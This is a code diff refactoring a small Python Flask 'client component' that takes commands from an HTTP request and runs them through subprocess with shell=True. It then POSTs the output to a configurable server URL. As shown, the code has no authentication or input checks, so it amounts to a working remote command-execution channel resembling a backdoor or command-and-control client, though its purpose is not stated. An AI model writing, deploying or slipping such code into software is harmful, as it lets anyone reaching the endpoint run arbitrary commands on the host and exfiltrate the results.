@@ -1,8 +1,14 @@
 ## client component that can receive commands from the server and execute them.
 
-from flask import Flask, request
+"""Client component that executes commands from the server."""
+
+import os
 import subprocess
+
+from flask import Flask, request
 import requests
+
+SERVER_URL = os.getenv('SERVER_URL', 'http://server_url')
 
 app = Flask(__name__)
 
@@ -13,11 +19,11 @@ def run_command():
 
     # Execute the command using subprocess
     try:
-        output = subprocess.check_output(command, shell=True)
+        output = subprocess.check_output(command, shell=True, text=True)
     except subprocess.CalledProcessError as err:
-        return err.output
+        output = err.output
 
     # Send the output back to the server using an HTTP POST request
-    requests.post('http://server_url/command_output', json={'output': output})
+    requests.post(f"{SERVER_URL}/command_output", json={'output': output})
 
     return 'Command executed successfully'
